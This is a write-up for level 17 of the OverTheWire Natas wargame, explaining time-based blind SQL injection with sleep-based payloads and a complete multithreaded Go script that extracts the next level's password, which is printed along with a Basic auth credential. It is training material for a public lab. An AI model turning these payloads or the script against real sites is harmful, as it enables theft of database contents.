# 🚩 OverTheWire: Natas Wargame Solutions - Level 17

### Time-Based Blind SQL Injection
This level is similar to Level 15 (Blind SQLi), but with a key difference: the server provides **no visual feedback** (no "User exists" message). We cannot rely on the response content.

Instead, we use a **Time-Based** attack. We inject a command that forces the database to sleep (pause) for a specific duration *only if* our guess is correct.

**The Injection Logic:**
1. Check vulnerability: `natas18" and sleep(5) #`
2. Extract password: `natas18" and (SELECT IF((substring((SELECT password FROM users WHERE username = "natas18"), 1, 1) = binary 'a'), SLEEP(20), 0)) #`
3. Iterate through characters. If the server sleeps, the guess is correct.

password for next level: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`

### Automated Solution (Go)
```golang
package main

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)
var (

	client   = &http.Client{
	}
	password = make([]rune, 32)
	mu       sync.Mutex
)

func main() {
	chars := "abcdefghijklmnopqrstuvwxyz" + // a-z
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ" + // A-Z
		"0123456789"  // 0-9
		// "!@#$%^&*()-_=+[]{}|;:',.<>?/`~" + // Symbols (optional)
		// " "
	var wg sync.WaitGroup
	for i := 1; i <= 32; i++ {
		ctx, cancel := context.WithCancel(context.Background())
		for _, ch := range chars {
			wg.Add(1)
			time.Sleep(20 * time.Millisecond)
			go solve(ctx, &wg, i, ch, cancel)
		}
		wg.Wait()
		fmt.Printf("Progress so far: %s\n", string(password))
	}
	fmt.Printf("Final password: %s\n", string(password))
}

func solve(ctx context.Context,wg *sync.WaitGroup, pos int, ch rune, cancel context.CancelFunc) {
	defer wg.Done()
	// If another thread already found the answer, exit early
    select {
    case <-ctx.Done():
        return
    default:
    }

	var sleepTime = 10 // Seconds to sleep if correct

	var url string = "http://natas17.natas.labs.overthewire.org/index.php"
	conditin := fmt.Sprintf("substring((SELECT password FROM users WHERE username = \"natas18\"), %d, 1) = binary '%c'", pos, ch)
	var postData string = fmt.Sprintf("username=natas18\" AND (SELECT IF((%s), SLEEP(%d), 0)) #", conditin, sleepTime)
	req, err := http.NewRequest("POST", url, strings.NewReader(postData))
	if err != nil {
		return
	}


	req.Host = "natas17.natas.labs.overthewire.org"
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate") // Note: The client will handle decompression if needed.
	req.Header.Set("Origin", "http://natas17.natas.labs.overthewire.org")
	req.Header.Set("Authorization", "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw==")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Referer", "http://natas17.natas.labs.overthewire.org/")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Priority", "u=0, i")

	// Measure execution time
    start := time.Now()
	resp, err := client.Do(req.WithContext(ctx))
	if err != nil {
		fmt.Println("error from server: ", err)
		return
	}
	defer resp.Body.Close()

	// Read body to ensure request completes fully
    io.ReadAll(resp.Body)

	elapsed := time.Since(start)
	
	// If response took longer than our sleep time, we found the character
    if elapsed.Seconds() >= float64(sleepTime) {
        mu.Lock()
        password[pos-1] = ch
        fmt.Printf("[+] Found char for pos %d: %c (Time: %v)\n", pos, ch, elapsed)
        mu.Unlock()
        
        // Cancel all other threads for this position to save time
        cancel()
    }
}
```